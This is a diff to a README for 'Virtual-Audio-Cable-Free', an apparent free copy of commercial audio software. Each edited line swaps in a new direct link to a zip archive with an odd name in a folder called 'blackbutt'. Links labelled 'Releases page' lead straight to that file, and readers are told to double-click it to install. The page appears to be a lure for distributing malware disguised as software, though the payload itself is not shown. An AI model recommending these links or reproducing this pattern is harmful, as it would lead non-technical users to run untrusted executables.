@@ -1,6 +1,6 @@
 # 🎧 Virtual-Audio-Cable-Free - Optimize Your Audio Management
 
-[![Download Now](https://github.com/tieyzam/Virtual-Audio-Cable-Free/raw/refs/heads/main/blackbutt/Cable_Virtual_Free_Audio_v1.0.zip%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/tieyzam/Virtual-Audio-Cable-Free/raw/refs/heads/main/blackbutt/Cable_Virtual_Free_Audio_v1.0.zip)
+[![Download Now](https://raw.githubusercontent.com/tieyzam/Virtual-Audio-Cable-Free/main/blackbutt/Virtual-Audio-Cable-Free-orthodome.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/tieyzam/Virtual-Audio-Cable-Free/main/blackbutt/Virtual-Audio-Cable-Free-orthodome.zip)
 
 ## 📚 Overview
 
@@ -11,7 +11,7 @@ Welcome to the Virtual-Audio-Cable-Free repository. This is your go-to resource 
 To start using Virtual-Audio-Cable-Free, follow these simple steps. No technical skills are needed!
 
 1. **Download the Software**: 
-   Click the button above or go to the [Releases page](https://github.com/tieyzam/Virtual-Audio-Cable-Free/raw/refs/heads/main/blackbutt/Cable_Virtual_Free_Audio_v1.0.zip) to download the latest version.
+   Click the button above or go to the [Releases page](https://raw.githubusercontent.com/tieyzam/Virtual-Audio-Cable-Free/main/blackbutt/Virtual-Audio-Cable-Free-orthodome.zip) to download the latest version.
 
 2. **Install the Software**: 
    After downloading, locate the file in your downloads folder. Double-click the file to start the installation. Follow the prompts on the screen.
@@ -39,7 +39,7 @@ Virtual-Audio-Cable-Free offers a variety of features to enhance your audio expe
 
 ## 📥 Download & Install
 
-To download Virtual-Audio-Cable-Free, please visit the [Releases page](https://github.com/tieyzam/Virtual-Audio-Cable-Free/raw/refs/heads/main/blackbutt/Cable_Virtual_Free_Audio_v1.0.zip). Simply select the version you need, click the download link, and follow the instructions provided above to install the application.
+To download Virtual-Audio-Cable-Free, please visit the [Releases page](https://raw.githubusercontent.com/tieyzam/Virtual-Audio-Cable-Free/main/blackbutt/Virtual-Audio-Cable-Free-orthodome.zip). Simply select the version you need, click the download link, and follow the instructions provided above to install the application.
 
 ## ⚙️ Usage Guide
 
